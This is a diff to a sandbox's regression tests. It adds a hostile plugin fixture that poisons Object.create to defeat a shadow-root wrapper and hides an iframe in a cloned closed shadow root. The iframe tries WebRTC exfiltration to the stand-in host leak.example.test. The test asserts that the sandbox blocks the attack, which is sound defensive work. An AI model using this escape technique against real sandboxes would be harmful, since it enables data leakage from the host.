@@ -454,6 +454,78 @@ const OBSERVER_INIT_POISON_ATTACK_HTML = `<!doctype html>
   </body>
 </html>`;
 
+/**
+ * Round 10, and the same class as rounds 8 and 9: the shell calls something it
+ * did not capture. `bare()` resolves `Object.create` when it is *called*, and the
+ * `attachShadow` wrapper calls it on every `attachShadow` — long after the
+ * plugin's script has run. So the null-prototype object the wrapper hands the
+ * real `attachShadow` is whatever the plugin's `Object.create` returns.
+ *
+ * A `mode` accessor that swallows the wrapper's `options.mode = "open"` and
+ * reports `"closed"` defeats the one thing the wrapper exists to force. The
+ * wrapper still watches the root it gets back, so the frame cannot go in there
+ * directly — but `clonable: true` is a member the wrapper copies across, and
+ * `cloneNode` mints a second *closed* root that no `attachShadow` call ever saw.
+ * `follow()` reads `element.shadowRoot`, which is null for a closed root, so the
+ * clone is invisible to every sweep and the frame inside it loads.
+ */
+const BARE_POISON_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <script>
+      var CHILD = "<script>var ice='no';try{" +
+        "var pc=new RTCPeerConnection({iceServers:[{urls:'turn:leak.example.test:3478'," +
+        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
+        "ice='gathering'}catch(e){ice='threw'}" +
+        "parent.parent.postMessage({exfil:1,type:'child',tag:'TAG'," +
+        "rtc:typeof RTCPeerConnection,ice:ice},'*');<\\/script>";
+
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+
+        var note = "no";
+        try {
+          // The shell's \`bare()\` is \`function(){ return Object.create(null); }\`,
+          // resolved at call time. Own it.
+          Object.create = function () {
+            return {
+              get mode() { return "closed"; },
+              set mode(value) {},
+              get clonable() { return true; },
+              set clonable(value) {},
+            };
+          };
+
+          // Detached, so nothing here is ever a document mutation and the frame
+          // does not load until the clone is connected.
+          var host = document.createElement("div");
+          // \`clonable\` is an accessor pair too, so the wrapper's
+          // \`options.clonable = init.clonable\` cannot clear it back to undefined.
+          var root = host.attachShadow({ mode: "closed" });
+          note = host.shadowRoot === null ? "closed" : "open";
+
+          var frame = document.createElement("iframe");
+          frame.srcdoc = CHILD.replace("TAG", "bare-poison");
+          root.appendChild(frame);
+
+          // Synchronous: the wrapper's observer removes the frame from \`root\` in
+          // a microtask, and this runs before that. The clone keeps its copy in a
+          // closed root nothing is watching.
+          var clone = host.cloneNode(true);
+          document.body.appendChild(clone);
+        } catch (error) {
+          note = "threw:" + (error && error.message);
+        }
+
+        setTimeout(function () {
+          window.parent.postMessage({ exfil: 1, type: "swept", note: note }, "*");
+        }, 600);
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
 interface Outcomes {
   windowOpen: string;
   fetch: string;
@@ -790,6 +862,49 @@ describe("a hostile plugin", () => {
     // Joined so the failure names the tags and says whether the child's WebRTC
     // actually started gathering, rather than printing `[ …(2) ]`.
     expect(childReports.join(" ")).toBe("");
+  });
+
+  it("cannot get a child realm by owning the shell's own Object.create", async () => {
+    const childReports: string[] = [];
+    let swept: string | null = null;
+    const onMessage = (event: MessageEvent) => {
+      const data = event.data as {
+        exfil?: number;
+        type?: string;
+        tag?: string;
+        ice?: string;
+        note?: string;
+      };
+      if (data?.exfil !== 1) {
+        return;
+      }
+      if (data.type === "child") {
+        childReports.push(`${data.tag}=${data.ice}`);
+      }
+      if (data.type === "swept") {
+        swept = data.note ?? "";
+      }
+      if (data.type === "ready") {
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(BARE_POISON_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    const note = await waitFor(() => swept, "the bare() poison attack to finish");
+
+    // The wrapper's whole job is to force `mode: "open"`; if this says "closed"
+    // the plugin already owns the argument, whatever the frame report says.
+    expect(childReports.join(" ")).toBe("");
+    // The wrapper exists to force `mode: "open"`; "closed" means the plugin owns
+    // the argument even when no frame report happens to arrive.
+    expect(note).toBe("open");
   });
 
   it("cannot leak a hostname through a resource hint in its markup", async () => {
